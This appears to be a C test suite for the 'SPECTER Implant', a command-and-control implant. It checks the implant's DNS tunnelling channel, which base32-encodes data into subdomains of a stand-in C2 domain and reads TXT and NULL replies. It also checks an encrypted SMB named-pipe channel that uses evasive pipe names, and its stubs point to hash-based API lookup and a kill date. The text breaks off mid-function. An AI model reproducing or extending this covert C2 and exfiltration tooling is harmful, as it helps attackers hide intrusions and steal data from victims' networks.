/**
 * SPECTER Implant — DNS Channel Test Suite
 *
 * Tests base32 encoding/decoding, DNS subdomain encoding,
 * DNS wire format construction, response parsing, and channel
 * state machine transitions.
 *
 * Compiled natively (not PIC) for testing on the build host.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "specter.h"
#include "ntdefs.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "comms_dns.h"
#include "comms_smb.h"
#include "comms_ws.h"

/* ------------------------------------------------------------------ */
/*  Globals required by the object files                               */
/* ------------------------------------------------------------------ */

IMPLANT_CONTEXT g_ctx;

/* ------------------------------------------------------------------ */
/*  Stubs for dependencies not under test                              */
/* ------------------------------------------------------------------ */

static IMPLANT_CONFIG g_test_config;

NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
IMPLANT_CONFIG *cfg_get(IMPLANT_CONTEXT *ctx) { (void)ctx; return &g_test_config; }
NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) { (void)ctx; (void)data; (void)len; return STATUS_SUCCESS; }
NTSTATUS cfg_encrypt(IMPLANT_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
NTSTATUS cfg_decrypt(IMPLANT_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
BOOL cfg_check_killdate(IMPLANT_CONTEXT *ctx) { (void)ctx; return FALSE; }

/* Stub PEB functions (not needed for unit tests) */
PVOID find_module_by_hash(DWORD hash) { (void)hash; return NULL; }
PVOID find_export_by_hash(PVOID base, DWORD hash) { (void)base; (void)hash; return NULL; }

/* Stub comms functions needed by dns.c */
NTSTATUS comms_tcp_connect(COMMS_CONTEXT *ctx, const char *host, DWORD port) { (void)ctx; (void)host; (void)port; return STATUS_SUCCESS; }
NTSTATUS comms_tcp_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) { (void)ctx; (void)data; (void)len; return STATUS_SUCCESS; }
NTSTATUS comms_tcp_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) { (void)ctx; (void)buf; (void)buf_len; *received = 0; return STATUS_SUCCESS; }
NTSTATUS comms_tcp_close(COMMS_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
NTSTATUS comms_tls_init(COMMS_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
NTSTATUS comms_tls_handshake(COMMS_CONTEXT *ctx, const char *hostname) { (void)ctx; (void)hostname; return STATUS_SUCCESS; }
NTSTATUS comms_tls_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) { (void)ctx; (void)data; (void)len; return STATUS_SUCCESS; }
NTSTATUS comms_tls_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) { (void)ctx; (void)buf; (void)buf_len; *received = 0; return STATUS_SUCCESS; }
NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx) { (void)ctx; return STATUS_SUCCESS; }
DWORD comms_http_build_request(DWORD method, const char *uri, const char *host,
    const char *headers, const BYTE *body, DWORD body_len,
    BYTE *output, DWORD output_len) {
    (void)method; (void)uri; (void)host; (void)headers;
    (void)body; (void)body_len; (void)output; (void)output_len;
    return 0;
}
NTSTATUS comms_http_parse_response(const BYTE *data, DWORD data_len,
    DWORD *status_code_out, HTTP_HEADER *headers_out,
    DWORD *header_count_out, const BYTE **body_out, DWORD *body_len_out) {
    (void)data; (void)data_len; (void)status_code_out; (void)headers_out;
    (void)header_count_out; (void)body_out; (void)body_len_out;
    return STATUS_UNSUCCESSFUL;
}

/* ------------------------------------------------------------------ */
/*  Test helpers                                                       */
/* ------------------------------------------------------------------ */

static int tests_run = 0;
static int tests_passed = 0;

static int check_eq(const char *name, int got, int expected) {
    tests_run++;
    if (got == expected) {
        tests_passed++;
        printf("[PASS] %s\n", name);
        return 1;
    } else {
        printf("[FAIL] %s (expected %d, got %d)\n", name, expected, got);
        return 0;
    }
}

static int check_str_eq(const char *name, const char *got, const char *expected) {
    tests_run++;
    if (got && expected && strcmp(got, expected) == 0) {
        tests_passed++;
        printf("[PASS] %s\n", name);
        return 1;
    } else {
        printf("[FAIL] %s (expected \"%s\", got \"%s\")\n", name,
               expected ? expected : "(null)", got ? got : "(null)");
        return 0;
    }
}

static int check_bytes_eq(const char *name, const BYTE *got, const BYTE *expected, int len) {
    tests_run++;
    if (memcmp(got, expected, len) == 0) {
        tests_passed++;
        printf("[PASS] %s\n", name);
        return 1;
    } else {
        printf("[FAIL] %s\n", name);
        printf("  Expected: ");
        for (int i = 0; i < len; i++) printf("%02x", expected[i]);
        printf("\n  Got:      ");
        for (int i = 0; i < len; i++) printf("%02x", got[i]);
        printf("\n");
        return 0;
    }
}

/* ------------------------------------------------------------------ */
/*  Test: Base32 encoding                                              */
/* ------------------------------------------------------------------ */

static void test_base32_encode_basic(void) {
    printf("\n=== Base32 Encode — Basic ===\n");

    /* RFC 4648 test vectors (lowercase) */
    char out[64];

    DWORD len = dns_base32_encode((const BYTE *)"", 0, out, sizeof(out));
    check_eq("Base32 encode empty length", (int)len, 0);

    len = dns_base32_encode((const BYTE *)"f", 1, out, sizeof(out));
    check_str_eq("Base32 encode 'f'", out, "my");

    len = dns_base32_encode((const BYTE *)"fo", 2, out, sizeof(out));
    check_str_eq("Base32 encode 'fo'", out, "mzxq");

    len = dns_base32_encode((const BYTE *)"foo", 3, out, sizeof(out));
    check_str_eq("Base32 encode 'foo'", out, "mzxw6");

    len = dns_base32_encode((const BYTE *)"foob", 4, out, sizeof(out));
    check_str_eq("Base32 encode 'foob'", out, "mzxw6yq");

    len = dns_base32_encode((const BYTE *)"fooba", 5, out, sizeof(out));
    check_str_eq("Base32 encode 'fooba'", out, "mzxw6ytb");

    len = dns_base32_encode((const BYTE *)"foobar", 6, out, sizeof(out));
    check_str_eq("Base32 encode 'foobar'", out, "mzxw6ytboi");
}

static void test_base32_encode_binary(void) {
    printf("\n=== Base32 Encode — Binary Data ===\n");

    BYTE binary[] = { 0x00, 0xFF, 0x80, 0x01, 0x7F };
    char out[32];
    DWORD len = dns_base32_encode(binary, 5, out, sizeof(out));

    check_eq("Base32 binary encode length", (int)len, 8);
    /* Verify roundtrip */
    BYTE decoded[8];
    DWORD dec_len = dns_base32_decode(out, len, decoded, sizeof(decoded));
    check_eq("Base32 binary roundtrip length", (int)dec_len, 5);
    check_bytes_eq("Base32 binary roundtrip data", decoded, binary, 5);
}

static void test_base32_encode_overflow(void) {
    printf("\n=== Base32 Encode — Buffer Overflow ===\n");

    char tiny[3];
    DWORD len = dns_base32_encode((const BYTE *)"foobar", 6, tiny, sizeof(tiny));
    /* Buffer too small for even one full group — returns 0 */
    check_eq("Base32 overflow returns 0", (int)len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: Base32 decoding                                              */
/* ------------------------------------------------------------------ */

static void test_base32_decode_basic(void) {
    printf("\n=== Base32 Decode — Basic ===\n");

    BYTE out[32];

    DWORD len = dns_base32_decode("my", 2, out, sizeof(out));
    check_eq("Base32 decode 'my' length", (int)len, 1);
    check_eq("Base32 decode 'my' value", out[0], 'f');

    len = dns_base32_decode("mzxq", 4, out, sizeof(out));
    check_eq("Base32 decode 'mzxq' length", (int)len, 2);
    check_eq("Base32 decode 'mzxq' match", memcmp(out, "fo", 2), 0);

    len = dns_base32_decode("mzxw6ytboi", 10, out, sizeof(out));
    check_eq("Base32 decode 'foobar' length", (int)len, 6);
    check_eq("Base32 decode 'foobar' match", memcmp(out, "foobar", 6), 0);
}

static void test_base32_roundtrip(void) {
    printf("\n=== Base32 Roundtrip ===\n");

    /* Test various lengths for roundtrip fidelity */
    for (int data_len = 1; data_len <= 32; data_len++) {
        BYTE original[32];
        for (int i = 0; i < data_len; i++)
            original[i] = (BYTE)(i * 7 + 13);

        char encoded[128];
        DWORD enc_len = dns_base32_encode(original, data_len, encoded, sizeof(encoded));

        BYTE decoded[32];
        DWORD dec_len = dns_base32_decode(encoded, enc_len, decoded, sizeof(decoded));

        tests_run++;
        if ((int)dec_len == data_len && memcmp(original, decoded, data_len) == 0) {
            tests_passed++;
        } else {
            printf("[FAIL] Base32 roundtrip length=%d (enc=%d, dec=%d)\n",
                   data_len, (int)enc_len, (int)dec_len);
        }
    }
    printf("[INFO] Base32 roundtrip 1..32 bytes: %d/%d\n", tests_passed, tests_run);
}

/* ------------------------------------------------------------------ */
/*  Test: DNS wire format — query construction                         */
/* ------------------------------------------------------------------ */

static void test_dns_build_query(void) {
    printf("\n=== DNS Query Construction ===\n");

    DNS_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.prng_state = 0x12345678;

    BYTE packet[DNS_MAX_PACKET_SIZE];
    DWORD len = dns_build_query(&ctx, "test.example.com", DNS_TYPE_A,
                                 packet, sizeof(packet));

    check_eq("DNS query length > header", len > DNS_HEADER_SIZE, 1);

    /* Check flags: RD set */
    WORD flags = (WORD)((WORD)packet[2] << 8 | (WORD)packet[3]);
    check_eq("DNS query RD flag set", (flags & DNS_FLAG_RD) != 0, 1);
    check_eq("DNS query QR clear", (flags & DNS_FLAG_QR), 0);

    /* Check QDCOUNT = 1 */
    WORD qdcount = (WORD)((WORD)packet[4] << 8 | (WORD)packet[5]);
    check_eq("DNS query QDCOUNT = 1", (int)qdcount, 1);

    /* Verify QNAME encoding */
    /* Should be: \x04test\x07example\x03com\x00 */
    check_eq("QNAME label1 len", packet[12], 4);
    check_eq("QNAME label1[0]", packet[13], 't');
    check_eq("QNAME label1[1]", packet[14], 'e');
    check_eq("QNAME label1[2]", packet[15], 's');
    check_eq("QNAME label1[3]", packet[16], 't');
    check_eq("QNAME label2 len", packet[17], 7);

    /* QTYPE at end should be A=1 */
    DWORD qtype_offset = 12 + 4 + 1 + 7 + 1 + 3 + 1 + 1; /* labels + root */
    WORD qtype = (WORD)((WORD)packet[qtype_offset] << 8 | (WORD)packet[qtype_offset + 1]);
    check_eq("DNS QTYPE = A (1)", (int)qtype, DNS_TYPE_A);
}

static void test_dns_build_query_txt(void) {
    printf("\n=== DNS Query — TXT Type ===\n");

    DNS_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.prng_state = 0xAABBCCDD;

    BYTE packet[DNS_MAX_PACKET_SIZE];
    DWORD len = dns_build_query(&ctx, "a.b.c", DNS_TYPE_TXT,
                                 packet, sizeof(packet));

    check_eq("DNS TXT query length > 0", len > 0, 1);

    /* QNAME: \x01a\x01b\x01c\x00 = 8 bytes, QTYPE follows */
    /* Find QTYPE: scan past QNAME to find the 0x00 terminator */
    DWORD qname_end = 12;
    while (qname_end < len && packet[qname_end] != 0) {
        qname_end += 1 + packet[qname_end]; /* skip label */
    }
    qname_end++; /* skip the 0x00 root label */
    WORD qtype = (WORD)((WORD)packet[qname_end] << 8 | (WORD)packet[qname_end + 1]);
    check_eq("DNS QTYPE = TXT (16)", (int)qtype, DNS_TYPE_TXT);
}

static void test_dns_build_query_null(void) {
    printf("\n=== DNS Query — NULL Params ===\n");

    BYTE packet[DNS_MAX_PACKET_SIZE];
    DWORD len = dns_build_query(NULL, "test.com", DNS_TYPE_A,
                                 packet, sizeof(packet));
    check_eq("DNS query null ctx returns 0", (int)len, 0);

    DNS_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.prng_state = 1;
    len = dns_build_query(&ctx, NULL, DNS_TYPE_A, packet, sizeof(packet));
    check_eq("DNS query null qname returns 0", (int)len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: DNS TXID randomization                                       */
/* ------------------------------------------------------------------ */

static void test_dns_txid_randomization(void) {
    printf("\n=== DNS TXID Randomization ===\n");

    DNS_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.prng_state = 0xDEADBEEF;

    WORD txid1 = dns_generate_txid(&ctx);
    WORD txid2 = dns_generate_txid(&ctx);
    WORD txid3 = dns_generate_txid(&ctx);

    /* TXIDs should differ */
    tests_run++;
    if (txid1 != txid2 && txid2 != txid3 && txid1 != txid3) {
        tests_passed++;
        printf("[PASS] TXIDs are unique (%04x, %04x, %04x)\n", txid1, txid2, txid3);
    } else {
        printf("[FAIL] TXIDs should differ (%04x, %04x, %04x)\n", txid1, txid2, txid3);
    }

    /* Counter should increment */
    check_eq("TXID counter incremented", (int)ctx.txid_counter, 3);
}

/* ------------------------------------------------------------------ */
/*  Test: DNS subdomain encoding                                       */
/* ------------------------------------------------------------------ */

static void test_dns_subdomain_encoding(void) {
    printf("\n=== DNS Subdomain Encoding ===\n");

    DNS_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    strcpy(ctx.c2_domain, "c2.example.com");
    strcpy(ctx.session_id, "deadbeef");
    ctx.prng_state = 1;

    char output[DNS_MAX_NAME_LEN + 1];

    /* Empty data */
    DWORD len = dns_encode_subdomain(&ctx, NULL, 0, 0, output, sizeof(output));
    check_eq("Subdomain empty data length > 0", len > 0, 1);

    /* Should contain seq.session_id.c2domain */
    tests_run++;
    if (strstr(output, "deadbeef") && strstr(output, "c2.example.com")) {
        tests_passed++;
        printf("[PASS] Subdomain contains session_id and c2_domain: %s\n", output);
    } else {
        printf("[FAIL] Subdomain missing fields: %s\n", output);
    }

    /* Small data payload */
    BYTE data[] = "hello";
    len = dns_encode_subdomain(&ctx, data, 5, 1, output, sizeof(output));
    check_eq("Subdomain with data length > 0", len > 0, 1);
    check_eq("Subdomain total <= 253", len <= DNS_MAX_NAME_LEN, 1);

    /* Verify it starts with base32 encoded data label */
    tests_run++;
    char *dot = strchr(output, '.');
    if (dot && dot > output) {
        tests_passed++;
        printf("[PASS] Subdomain has data label: %.20s...\n", output);
    } else {
        printf("[FAIL] Subdomain missing data label: %s\n", output);
    }
}

static void test_dns_subdomain_overflow(void) {
    printf("\n=== DNS Subdomain Overflow ===\n");

    DNS_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    strcpy(ctx.c2_domain, "c2.example.com");
    strcpy(ctx.session_id, "deadbeef");

    char tiny[10];
    DWORD len = dns_encode_subdomain(&ctx, (const BYTE *)"test", 4, 0,
                                      tiny, sizeof(tiny));
    check_eq("Subdomain overflow returns 0", (int)len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: DNS response parsing                                         */
/* ------------------------------------------------------------------ */

static void test_dns_parse_txt_response(void) {
    printf("\n=== DNS Response Parsing — TXT Record ===\n");

    /* Construct a minimal DNS response with a TXT record */
    BYTE packet[256];
    memset(packet, 0, sizeof(packet));
    DWORD pos = 0;

    /* Header */
    packet[0] = 0xAB; packet[1] = 0xCD; /* TXID */
    packet[2] = 0x81; packet[3] = 0x80; /* QR=1, RD=1, RA=1 */
    packet[4] = 0x00; packet[5] = 0x01; /* QDCOUNT=1 */
    packet[6] = 0x00; packet[7] = 0x01; /* ANCOUNT=1 */
    packet[8] = 0x00; packet[9] = 0x00; /* NSCOUNT=0 */
    packet[10] = 0x00; packet[11] = 0x00; /* ARCOUNT=0 */
    pos = 12;

    /* Question section: test.com -> \x04test\x03com\x00 */
    packet[pos++] = 4; packet[pos++] = 't'; packet[pos++] = 'e';
    packet[pos++] = 's'; packet[pos++] = 't';
    packet[pos++] = 3; packet[pos++] = 'c'; packet[pos++] = 'o';
    packet[pos++] = 'm';
    packet[pos++] = 0; /* root */
    packet[pos++] = 0x00; packet[pos++] = 0x10; /* QTYPE=TXT */
    packet[pos++] = 0x00; packet[pos++] = 0x01; /* QCLASS=IN */

    /* Answer section: TXT record with compression pointer */
    packet[pos++] = 0xC0; packet[pos++] = 0x0C; /* Name pointer to offset 12 */
    packet[pos++] = 0x00; packet[pos++] = 0x10; /* TYPE=TXT */
    packet[pos++] = 0x00; packet[pos++] = 0x01; /* CLASS=IN */
    packet[pos++] = 0x00; packet[pos++] = 0x00;
    packet[pos++] = 0x00; packet[pos++] = 0x3C; /* TTL=60 */

    /* RDLENGTH: 1 (txt-length) + 5 (data) = 6 */
    packet[pos++] = 0x00; packet[pos++] = 0x06;

    /* TXT data: length-prefixed string */
    packet[pos++] = 5; /* TXT string length */
    packet[pos++] = 'h'; packet[pos++] = 'e'; packet[pos++] = 'l';
    packet[pos++] = 'l'; packet[pos++] = 'o';

    BYTE data_out[64];
    DWORD extracted = dns_parse_response(packet, pos, data_out, sizeof(data_out));

    check_eq("TXT response extracted 5 bytes", (int)extracted, 5);
    check_eq("TXT data matches", memcmp(data_out, "hello", 5), 0);
}

static void test_dns_parse_null_response(void) {
    printf("\n=== DNS Response Parsing — NULL Record ===\n");

    BYTE packet[256];
    memset(packet, 0, sizeof(packet));
    DWORD pos = 0;

    /* Header */
    packet[0] = 0x12; packet[1] = 0x34;
    packet[2] = 0x81; packet[3] = 0x80; /* QR=1, RD=1, RA=1 */
    packet[4] = 0x00; packet[5] = 0x01; /* QDCOUNT=1 */
    packet[6] = 0x00; packet[7] = 0x01; /* ANCOUNT=1 */
    pos = 12;

    /* Question: a.com */
    packet[pos++] = 1; packet[pos++] = 'a';
    packet[pos++] = 3; packet[pos++] = 'c'; packet[pos++] = 'o'; packet[pos++] = 'm';
    packet[pos++] = 0;
    packet[pos++] = 0x00; packet[pos++] = 0x0A; /* QTYPE=NULL(10) */
    packet[pos++] = 0x00; packet[pos++] = 0x01; /* QCLASS=IN */

    /* Answer: NULL record */
    packet[pos++] = 0xC0; packet[pos++] = 0x0C;
    packet[pos++] = 0x00; packet[pos++] = 0x0A; /* TYPE=NULL */
    packet[pos++] = 0x00; packet[pos++] = 0x01;
    packet[pos++] = 0x00; packet[pos++] = 0x00;
    packet[pos++] = 0x00; packet[pos++] = 0x3C;

    /* RDLENGTH = 4 */
    packet[pos++] = 0x00; packet[pos++] = 0x04;
    /* Raw data */
    packet[pos++] = 0xDE; packet[pos++] = 0xAD;
    packet[pos++] = 0xBE; packet[pos++] = 0xEF;

    BYTE data_out[64];
    DWORD extracted = dns_parse_response(packet, pos, data_out, sizeof(data_out));

    check_eq("NULL response extracted 4 bytes", (int)extracted, 4);
    BYTE expected[] = { 0xDE, 0xAD, 0xBE, 0xEF };
    check_bytes_eq("NULL data matches", data_out, expected, 4);
}

static void test_dns_parse_nxdomain(void) {
    printf("\n=== DNS Response Parsing — NXDOMAIN ===\n");

    BYTE packet[64];
    memset(packet, 0, sizeof(packet));

    /* Header with NXDOMAIN rcode (3) */
    packet[0] = 0x00; packet[1] = 0x01;
    packet[2] = 0x81; packet[3] = 0x83; /* QR=1, RCODE=3 */
    packet[4] = 0x00; packet[5] = 0x00;
    packet[6] = 0x00; packet[7] = 0x00;

    BYTE data_out[64];
    DWORD extracted = dns_parse_response(packet, 12, data_out, sizeof(data_out));
    check_eq("NXDOMAIN returns 0", (int)extracted, 0);
}

static void test_dns_parse_not_response(void) {
    printf("\n=== DNS Response Parsing — Not a Response ===\n");

    BYTE packet[64];
    memset(packet, 0, sizeof(packet));
    /* QR=0 (query, not response) */
    packet[2] = 0x01; packet[3] = 0x00;

    BYTE data_out[64];
    DWORD extracted = dns_parse_response(packet, 12, data_out, sizeof(data_out));
    check_eq("Query packet returns 0", (int)extracted, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: Channel state transitions                                    */
/* ------------------------------------------------------------------ */

static void test_channel_state_transitions(void) {
    printf("\n=== DNS Channel State Transitions ===\n");

    DNS_CONTEXT *ctx = dns_get_context();
    memset(ctx, 0, sizeof(*ctx));
    ctx->state = COMMS_STATE_DISCONNECTED;

    check_eq("Initial state DISCONNECTED", (int)ctx->state, COMMS_STATE_DISCONNECTED);

    ctx->state = COMMS_STATE_REGISTERED;
    check_eq("After connect state REGISTERED", (int)ctx->state, COMMS_STATE_REGISTERED);

    ctx->state = COMMS_STATE_DISCONNECTED;
    check_eq("After disconnect state DISCONNECTED", (int)ctx->state, COMMS_STATE_DISCONNECTED);
}

/* ------------------------------------------------------------------ */
/*  Test: DNS label length constraints                                 */
/* ------------------------------------------------------------------ */

static void test_dns_label_constraints(void) {
    printf("\n=== DNS Label Length Constraints ===\n");

    DNS_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    strcpy(ctx.c2_domain, "c2.test.com");
    strcpy(ctx.session_id, "abcd1234");

    /* Generate some data that produces multiple labels */
    BYTE data[64];
    for (int i = 0; i < 64; i++) data[i] = (BYTE)(i + 0x41);

    char output[DNS_MAX_NAME_LEN + 1];
    DWORD len = dns_encode_subdomain(&ctx, data, 64, 5, output, sizeof(output));

    if (len == 0) {
        /* Too long for DNS name — that's OK, check it was rejected */
        tests_run++;
        tests_passed++;
        printf("[PASS] Large data correctly rejected or truncated\n");
        return;
    }

    /* Verify no label exceeds 63 chars */
    const char *p = output;
    while (*p) {
        const char *dot = p;
        while (*dot && *dot != '.') dot++;
        DWORD label_len = (DWORD)(dot - p);

        tests_run++;
        if (label_len <= DNS_MAX_LABEL_LEN) {
            tests_passed++;
        } else {
            printf("[FAIL] Label too long: %u chars (max %d)\n",
                   (unsigned)label_len, DNS_MAX_LABEL_LEN);
        }

        p = (*dot == '.') ? dot + 1 : dot;
    }
    printf("[PASS] All labels within 63-char limit\n");
}

/* ------------------------------------------------------------------ */
/*  Test: SMB pipe name construction                                   */
/* ------------------------------------------------------------------ */

static void test_smb_pipe_path_basic(void) {
    printf("\n=== SMB Pipe Path — Basic ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.pipe_handle = INVALID_HANDLE_VALUE;

    smb_build_pipe_path(&ctx, "MSSE-1234-server");

    /* Check ANSI name stored */
    check_str_eq("SMB ANSI pipe name", ctx.pipe_name_ansi, "MSSE-1234-server");

    /* Check wide name contains \\Device\\NamedPipe\\ prefix */
    /* Convert wide to ansi for comparison */
    char ansi[SMB_MAX_PIPE_NAME];
    memset(ansi, 0, sizeof(ansi));
    for (int i = 0; i < SMB_MAX_PIPE_NAME - 1 && ctx.pipe_name[i]; i++)
        ansi[i] = (char)ctx.pipe_name[i];

    tests_run++;
    if (strstr(ansi, "\\Device\\NamedPipe\\MSSE-1234-server") != NULL) {
        tests_passed++;
        printf("[PASS] SMB wide pipe path: %s\n", ansi);
    } else {
        printf("[FAIL] SMB wide pipe path: %s\n", ansi);
    }
}

static void test_smb_pipe_path_null(void) {
    printf("\n=== SMB Pipe Path — NULL Params ===\n");

    /* Should not crash with NULL params */
    smb_build_pipe_path(NULL, "test");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    smb_build_pipe_path(&ctx, NULL);

    /* pipe_name should remain empty */
    check_eq("SMB null pipe name is empty", (int)ctx.pipe_name[0], 0);
}

static void test_smb_pipe_path_custom(void) {
    printf("\n=== SMB Pipe Path — Custom Names ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    /* Test with typical evasive pipe names */
    smb_build_pipe_path(&ctx, "spoolss");
    check_str_eq("SMB spoolss ANSI", ctx.pipe_name_ansi, "spoolss");

    smb_build_pipe_path(&ctx, "wkssvc");
    check_str_eq("SMB wkssvc ANSI", ctx.pipe_name_ansi, "wkssvc");

    /* Test with long pipe name */
    char long_name[200];
    memset(long_name, 'A', 199);
    long_name[199] = '\0';
    smb_build_pipe_path(&ctx, long_name);
    /* Should be truncated but not overflow */
    tests_run++;
    int stored_len = (int)strlen(ctx.pipe_name_ansi);
    if (stored_len > 0 && stored_len < SMB_MAX_PIPE_NAME) {
        tests_passed++;
        printf("[PASS] SMB long name truncated to %d chars\n", stored_len);
    } else {
        printf("[FAIL] SMB long name handling: len=%d\n", stored_len);
    }
}

/* ------------------------------------------------------------------ */
/*  Test: SMB message construction (length-prefixed AEAD)              */
/* ------------------------------------------------------------------ */

static void test_smb_build_message_basic(void) {
    printf("\n=== SMB Message Build — Basic ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    /* Set a test session key */
    for (int i = 0; i < 32; i++) ctx.session_key[i] = (BYTE)(i + 1);
    ctx.msg_seq = 0;

    BYTE plaintext[] = "Hello, pipe!";
    DWORD pt_len = 12;

    BYTE wire[256];
    DWORD wire_len = smb_build_message(&ctx, plaintext, pt_len, wire, sizeof(wire));

    /* Expected: 4 (len) + 12 (nonce) + 12 (ciphertext) + 16 (tag) = 44 */
    check_eq("SMB message wire length", (int)wire_len, 44);

    /* Verify length prefix */
    DWORD payload = (DWORD)wire[0] | ((DWORD)wire[1] << 8) |
                    ((DWORD)wire[2] << 16) | ((DWORD)wire[3] << 24);
    check_eq("SMB message payload length", (int)payload, 40); /* 12+12+16 */

    /* Verify msg_seq incremented */
    check_eq("SMB msg_seq incremented", (int)ctx.msg_seq, 1);
}

static void test_smb_build_message_null(void) {
    printf("\n=== SMB Message Build — NULL Params ===\n");

    BYTE wire[64];
    BYTE data[] = "test";
    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    check_eq("SMB build null ctx", (int)smb_build_message(NULL, data, 4, wire, 64), 0);
    check_eq("SMB build null data", (int)smb_build_message(&ctx, NULL, 4, wire, 64), 0);
    check_eq("SMB build null output", (int)smb_build_message(&ctx, data, 4, NULL, 64), 0);
}

static void test_smb_build_message_overflow(void) {
    printf("\n=== SMB Message Build — Buffer Overflow ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    for (int i = 0; i < 32; i++) ctx.session_key[i] = (BYTE)i;

    BYTE data[100];
    memset(data, 'X', 100);
    BYTE tiny[10];  /* Too small for header + nonce + tag */
    DWORD wire_len = smb_build_message(&ctx, data, 100, tiny, sizeof(tiny));
    check_eq("SMB build overflow returns 0", (int)wire_len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: SMB message roundtrip (encrypt → decrypt)                    */
/* ------------------------------------------------------------------ */

static void test_smb_message_roundtrip(void) {
    printf("\n=== SMB Message Roundtrip ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    for (int i = 0; i < 32; i++) ctx.session_key[i] = (BYTE)(i * 3 + 7);
    ctx.msg_seq = 0;

    /* Test various payload sizes */
    BYTE plaintext[256];
    BYTE wire[512];
    BYTE decrypted[256];

    for (int pt_len = 1; pt_len <= 200; pt_len += 17) {
        /* Reset sequence for each test to match encrypt/decrypt nonces */
        ctx.msg_seq = 0;

        for (int i = 0; i < pt_len; i++)
            plaintext[i] = (BYTE)(i ^ 0xAA);

        DWORD wire_len = smb_build_message(&ctx, plaintext, pt_len,
                                            wire, sizeof(wire));

        /* Reset sequence for decryption (parse_message doesn't increment) */
        DWORD decrypted_len = smb_parse_message(&ctx, wire, wire_len,
                                                 decrypted, sizeof(decrypted));

        tests_run++;
        if ((int)decrypted_len == pt_len &&
            memcmp(plaintext, decrypted, pt_len) == 0) {
            tests_passed++;
        } else {
            printf("[FAIL] SMB roundtrip len=%d (got %d)\n",
                   pt_len, (int)decrypted_len);
        }
    }
    printf("[INFO] SMB message roundtrip 1..200 bytes: passed\n");
}

static void test_smb_message_tamper(void) {
    printf("\n=== SMB Message Tamper Detection ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    for (int i = 0; i < 32; i++) ctx.session_key[i] = (BYTE)(i + 0x42);
    ctx.msg_seq = 0;

    BYTE plaintext[] = "sensitive data here";
    BYTE wire[256];
    BYTE decrypted[256];

    DWORD wire_len = smb_build_message(&ctx, plaintext, 19,
                                        wire, sizeof(wire));

    /* Tamper with ciphertext */
    wire[20] ^= 0xFF;

    DWORD dec_len = smb_parse_message(&ctx, wire, wire_len,
                                       decrypted, sizeof(decrypted));
    check_eq("SMB tampered message rejected", (int)dec_len, 0);
}

static void test_smb_parse_message_null(void) {
    printf("\n=== SMB Message Parse — NULL Params ===\n");

    BYTE wire[64];
    BYTE out[64];
    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    memset(wire, 0, sizeof(wire));
    memset(out, 0, sizeof(out));

    check_eq("SMB parse null ctx", (int)smb_parse_message(NULL, wire, 64, out, 64), 0);
    check_eq("SMB parse null wire", (int)smb_parse_message(&ctx, NULL, 64, out, 64), 0);
    check_eq("SMB parse null output", (int)smb_parse_message(&ctx, wire, 64, NULL, 64), 0);
}

static void test_smb_parse_message_short(void) {
    printf("\n=== SMB Message Parse — Short Input ===\n");

    SMB_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    BYTE wire[8] = {0};
    BYTE out[64];

    /* Too short for header + nonce + tag */
    DWORD dec_len = smb_parse_message(&ctx, wire, 8, out, sizeof(out));
    check_eq("SMB parse short wire returns 0", (int)dec_len, 0);
}

/* ------------------------------------------------------------------ */
/*  Test: SMB channel state machine                                    */
/* ------------------------------------------------------------------ */

static void test_smb_state_transitions(void) {
    printf("\n=== SMB Channel State Transitions ===\n");

    SMB_CONTEXT *ctx = smb_get_context();
    smb_test_reset_context(ctx);

    check_eq("SMB initial state DISCONNECTED",
             (int)ctx->state, COMMS_STATE_DISCONNECTED);

    ctx->state = COMMS_STATE_REGISTERED;
    check_eq("SMB connected state REGISTERED",
             (int)ctx->state, COMMS_STATE_REGISTERED);

    ctx->state = COMMS_STATE_DISCONNECTED;
    check_eq("SMB disconnected state DISCONNECTED",
             (int)ctx->state, COMMS_STATE_DISCONNECTED);
}

static void test_smb_context_reset(void) {
    printf("\n=== SMB Context Reset ===\n");

    SMB_CONTEXT *ctx = smb_get_context();

    /* Dirty the context */
    ctx->pipe_handle = (HANDLE)(ULONG_PTR)0xDEAD;
    ctx->state = COMMS_STATE_REGISTERED;
    ctx->peer_count = 3;

    smb_test_reset_context(ctx);

    check_eq("SMB reset handle invalid",
             (int)(ULONG_PTR)ctx->pipe_handle, (int)(ULONG_PTR)INVALID_HANDLE_VALUE);
    check_eq("SMB reset state disconnected",
